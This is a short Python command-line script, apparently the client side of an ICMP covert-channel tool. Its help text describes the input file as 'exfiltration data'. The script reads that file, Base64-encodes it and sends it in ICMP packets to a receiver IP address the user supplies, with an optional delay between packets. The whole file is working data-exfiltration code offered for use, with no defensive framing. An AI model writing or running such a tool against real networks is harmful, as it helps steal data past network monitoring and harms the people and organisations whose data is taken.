#!/usr/bin/python3

import os, socket, argparse, logging
from channel import ICMP_Channel_Client, ICMP_Channel_Server, Channel_Transport

# Initialize argument parsing
parser = argparse.ArgumentParser()
parser.add_argument("inputfile", help="File to read exfiltration data from")
parser.add_argument("receiver", help="IPv4 of receiver")
parser.add_argument("-d", "--delay", type=int, default=0, help="Delay between sending packets in ms")
parser.add_argument("-e", "--encoding", type=str, default="utf-8", help="Encoding to use")
parser.add_argument("-v", "--verbose", action='store_true', help="Increase output verbosity")
args = parser.parse_args()

# Initialize logging
logger = logging.getLogger(__name__)
logger.setLevel(args.verbose and logging.DEBUG or logging.INFO)
formatter = logging.Formatter('%(levelname)s: [CLIENT] %(message)s')
handler = logging.StreamHandler()
handler.setFormatter(formatter)
logger.addHandler(handler)

# Check if file exists
input_file_content = bytes()
if os.path.exists(args.inputfile):
    with open(args.inputfile, "rb") as file_handle:
        input_file_content = file_handle.read()

# Step 1: Initialize ICMP channel
icmp = ICMP_Channel_Client(logger)

# Step 2: Set up transport encoding
transport = Channel_Transport.Base64(args.encoding)
icmp.set_transport(transport)

# Step 3: Send data
icmp.send_data(input_file_content, args.receiver, args.delay)
icmp.close()
logger.info("Done")